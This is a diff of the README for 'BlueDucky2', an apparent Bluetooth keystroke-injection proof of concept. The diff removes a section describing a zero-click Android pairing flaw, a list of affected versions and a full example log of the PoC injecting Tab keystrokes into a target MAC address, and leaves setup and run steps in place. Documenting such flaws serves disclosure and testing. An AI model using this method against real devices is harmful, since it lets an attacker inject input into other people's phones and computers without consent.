@@ -1,5 +1,7 @@
 # BlueDucky2
 
+
+
 ## Setup
 
 ```
@@ -24,22 +26,6 @@ gcc -o bdaddr ~/bluez/tools/bdaddr.c ~/bluez/src/oui.c -I ~/bluez -lbluetooth
 sudo cp bdaddr /usr/local/bin/
 ```
 
-## Keystroke Injection
-
-### Android Keystroke Injection
-
-Android devices are vulnerable prior to the 2023-12-05 security patch level.
-
-When Bluetooth is enabled on an unpatched Android device, an attacker can pair an emulated Bluetooth keyboard and inject keystrokes, without user confirmation. This is a zero-click attack that works whenever Bluetooth is enabled.
-
-#### Affected Versions
-
-This vulnerability affects Android ~4.2.2 and later.
-
-- Android 4.2.2 - 10 will not be patched
-- Android 11 - 14 have patches available (2023-12-05 security patch level)
-- Pixel 6, 7 and 8 were patched
-- Pixel 5 and older remain vulnerable
 
 #### Starting State
 
@@ -54,53 +40,6 @@ Run the PoC targeting Android device `5C:F3:70:AA:07:BD` using interface `hci1`.
 ```
 
 If successful, the PoC will inject a payload of `tab` keystrokes for 10 seconds.
-
-#### Example Output
-
-```
-> ./keystroke-injection-android-linux.py -i hci1 -t 5C:F3:70:AA:07:BD
-[2024-01-07 11:03:01.329]  executing 'sudo service bluetooth restart'
-[2024-01-07 11:03:01.959]  configuring Bluetooth adapter
-[2024-01-07 11:03:01.963]  calling RegisterProfile
-[2024-01-07 11:03:01.966]  running dbus loop
-[2024-01-07 11:03:02.096]  executing 'sudo hciconfig hci1 name Hi, My Name is Keyboard'
-[2024-01-07 11:03:02.108]  executing 'hciconfig hci1 name'
-[2024-01-07 11:03:02.128]  executing 'sudo hciconfig hci1 class 0x002540'
-[2024-01-07 11:03:02.141]  executing 'hciconfig hci1 class'
-[2024-01-07 11:03:02.144]  executing 'hcitool name 5C:F3:70:AA:07:BD'
-[2024-01-07 11:03:02.877]  connecting to SDP
-[2024-01-07 11:03:02.877]  connecting to 5C:F3:70:AA:07:BD on port 1
-[2024-01-07 11:03:03.832]  SUCCESS! connected on port 1
-[2024-01-07 11:03:03.832]  executing 'sudo btmgmt --index hci1 io-cap 1'
-[2024-01-07 11:03:03.847]  executing 'sudo btmgmt --index hci1 ssp 1'
-[2024-01-07 11:03:03.858]  connected to SDP (L2CAP 1) on target
-[2024-01-07 11:03:03.865]  'NoInputNoOutput' pairing-agent is running
-[2024-01-07 11:03:04.111]  connecting to 5C:F3:70:AA:07:BD on port 19
-[2024-01-07 11:03:04.864]  ERROR connecting on port 19: [Errno 22] Invalid argument
-[2024-01-07 11:03:04.864]  connecting to 5C:F3:70:AA:07:BD on port 17
-[2024-01-07 11:03:04.932]  SUCCESS! connected on port 17
-[2024-01-07 11:03:04.932]  connecting to HID Interrupt
-[2024-01-07 11:03:04.932]  connecting to 5C:F3:70:AA:07:BD on port 19
-[2024-01-07 11:03:05.008]  SUCCESS! connected on port 19
-[2024-01-07 11:03:05.008]  connected to HID Interrupt (L2CAP 19) on target
-[2024-01-07 11:03:05.008]  connected to HID Control (L2CAP 17) on target
-[2024-01-07 11:03:05.009]  [RX-17] 9000
-[2024-01-07 11:03:05.009]  [TX-17] 00
-[2024-01-07 11:03:05.065]  [RX-19] a20101
-[2024-01-07 11:03:05.259]  [TX-19] a101000000000000000000
-[2024-01-07 11:03:05.259]  injecting Tab keypresses for 10 seconds
-[2024-01-07 11:03:05.259]  [TX-19] a10100002b000000000000
-[2024-01-07 11:03:05.264]  [TX-19] a101000000000000000000
-[2024-01-07 11:03:05.318]  [TX-19] a10100002b000000000000
-[2024-01-07 11:03:05.323]  [TX-19] a101000000000000000000
-[2024-01-07 11:03:05.377]  [TX-19] a10100002b000000000000
-[2024-01-07 11:03:05.382]  [TX-19] a101000000000000000000
-[2024-01-07 11:03:05.436]  [TX-19] a10100002b000000000000
-...
-[2024-01-07 11:03:15.261]  [TX-19] a101000000000000000000
-[2024-01-07 11:03:15.319]  payload has been transmitted; disconnecting Bluetooth HID client
-[2024-01-07 11:03:15.321]  taking 'hci1' offline
-```
 
 ### Linux Keystroke Injection
 
